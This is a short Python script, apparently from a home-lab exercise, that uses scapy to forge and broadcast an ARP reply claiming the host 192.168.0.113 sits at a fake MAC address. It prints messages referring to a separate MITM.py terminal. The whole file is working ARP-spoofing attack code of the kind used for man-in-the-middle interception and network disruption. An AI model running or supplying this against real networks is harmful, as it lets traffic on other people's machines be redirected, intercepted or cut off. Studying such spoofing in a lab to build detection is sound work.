from scapy.all import sendp, Ether, ARP
from scapy.interfaces import dev_from_index

my_interface = dev_from_index(9) 

target_ip = "192.168.0.113" 

fake_mac = "00:11:22:33:44:55"

print(f"[*] Forging ARP Reply: Claiming {target_ip} is at MAC {fake_mac}...")

malicious_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=target_ip, hwsrc=fake_mac)

# Send the packet out onto the network
sendp(malicious_packet, iface=my_interface)

print("[+] Spoofed packet sent! Check your MITM.py terminal.")